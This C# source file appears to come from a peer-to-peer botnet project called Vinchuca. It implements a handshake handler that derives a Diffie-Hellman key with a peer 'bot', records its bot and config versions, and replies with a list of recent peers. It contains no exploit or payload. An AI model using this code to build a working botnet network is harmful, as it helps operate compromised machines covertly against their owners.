using System;
using Vinchuca.Crypto;
using Vinchuca.Network.Protocol.Messages;
using Vinchuca.Network.Protocol.Messages.System;
using Vinchuca.Network.Protocol.Peers;
using Vinchuca.Workers;

namespace Vinchuca.Network.Protocol.Handlers
{
    public class HelloAckSynMessageHandler : IMessageHandler
    {
        private readonly PeerList _peerList;
        private readonly MessageManager _messageManager;

        public HelloAckSynMessageHandler(PeerList peerList, MessageManager messageManager)
        {
            _peerList = peerList;
            _messageManager = messageManager;
        }

        public void Handle(BotMessage botMessage)
        {
            var msg = botMessage.Message as HelloAckSynMessage;
            PeerInfo peerInfo;
            if (!_peerList.TryGet(botMessage.Header.EndPoint, out peerInfo))
                return;

            peerInfo.BotId = botMessage.Header.BotId;
            peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
            peerInfo.Handshaked = true;
            peerInfo.BotVersion = msg.BotVersion;
            peerInfo.CfgVersion = msg.CfgVersion;
            if (_peerList.TryRegister(peerInfo))
            {
                var reply = new HelloAckMessage
                {
                    BotVersion = 1,
                    CfgVersion = 1,
                    Peers = _peerList.Recent().ToArray()
                };
                _messageManager.Send(reply, botMessage.Header.BotId, botMessage.Header.CorrelationId);

                //_versionManager.CheckBotVersion(msg.BotVersion, msg.Header.BotId, endpoint);
                //_versionManager.CheckCfgVersion(msg.CfgVersion, msg.Header.BotId, endpoint);
            }
        }
    }
}